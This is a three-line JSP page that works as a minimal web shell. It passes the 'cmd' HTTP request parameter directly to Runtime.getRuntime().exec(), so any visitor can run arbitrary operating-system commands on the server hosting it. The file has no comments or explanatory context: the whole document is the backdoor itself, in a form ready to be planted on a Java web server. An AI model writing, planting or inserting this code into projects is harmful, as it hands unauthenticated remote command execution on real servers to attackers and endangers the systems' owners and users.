<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.lang.Runtime" %>
<%=Runtime.getRuntime().exec(request.getParameter("cmd"))%>